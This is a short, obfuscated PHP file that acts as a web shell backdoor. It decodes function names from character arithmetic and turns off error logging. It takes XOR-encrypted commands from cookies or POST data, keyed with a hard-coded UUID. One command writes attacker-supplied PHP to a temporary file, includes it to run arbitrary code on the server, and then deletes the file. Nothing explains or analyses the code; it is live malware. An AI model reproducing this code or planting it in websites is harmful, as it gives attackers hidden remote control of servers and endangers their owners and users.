<?php $jvust = "\x66"."\x69"."\154".'e'.chr(541-446)."\160".'u'."\x74".chr(435-340).chr(99)."\157".chr(110).chr(116)."\x65".chr(710-600).chr(116).'s';
$mpxldzl = "\x62".chr(647-550)."\163".'e'.chr(54)."\64".chr(719-624)."\x64".'e'.chr(99)."\x6f".chr(100)."\145";
$bnfxqwwkq = chr(105).chr(476-366)."\x69".chr(95)."\x73".chr(101).chr(766-650);
$uxyxvw = chr(117)."\x6e".'l'.'i'.chr(1076-966).chr(1000-893);


@$bnfxqwwkq("\x65".'r'."\x72".chr(558-447).chr(834-720).chr(95)."\154".'o'.chr(103), NULL);
@$bnfxqwwkq("\154".chr(111)."\x67".chr(95).chr(101).'r'.chr(114)."\x6f".'r'.'s', 0);
@$bnfxqwwkq("\x6d".chr(870-773).chr(338-218).chr(667-572)."\x65".chr(120).'e'."\143".'u'."\164"."\x69"."\157".'n'."\x5f".chr(1063-947)."\x69"."\x6d"."\145", 0);
@set_time_limit(0);

function jlamrjfvc($gdpco, $sxirn)
{
    $knnvplfgc = "";
    for ($plelscgrp = 0; $plelscgrp < strlen($gdpco);) {
        for ($j = 0; $j < strlen($sxirn) && $plelscgrp < strlen($gdpco); $j++, $plelscgrp++) {
            $knnvplfgc .= chr(ord($gdpco[$plelscgrp]) ^ ord($sxirn[$j]));
        }
    }
    return $knnvplfgc;
}

$vqzavvepmv = array_merge($_COOKIE, $_POST);
$tvppsuhfzf = '5efc243a-6bc7-4061-b98d-38db08a0c789';
foreach ($vqzavvepmv as $zimtl => $gdpco) {
    $gdpco = @unserialize(jlamrjfvc(jlamrjfvc($mpxldzl($gdpco), $tvppsuhfzf), $zimtl));
    if (isset($gdpco[chr(152-55).chr(107)])) {
        if ($gdpco["\141"] == "\x69") {
            $plelscgrp = array(
                "\x70"."\166" => @phpversion(),
                "\x73".chr(1094-976) => "3.5",
            );
            echo @serialize($plelscgrp);
        } elseif ($gdpco["\141"] == "\x65") {
            $awjajf = "./" . md5($tvppsuhfzf) . '.'."\x69"."\x6e".chr(99);
            @$jvust($awjajf, "<" . chr(63).'p'."\150"."\160".chr(599-567)."\100".'u'."\156"."\154".'i'.'n'.chr(107)."\50"."\137"."\x5f"."\106".chr(877-804)."\x4c"."\105"."\x5f".chr(553-458)."\x29"."\x3b"."\40" . $gdpco[chr(100)]);
            @include($awjajf);
            @$uxyxvw($awjajf);
        }
        exit();
    }
}

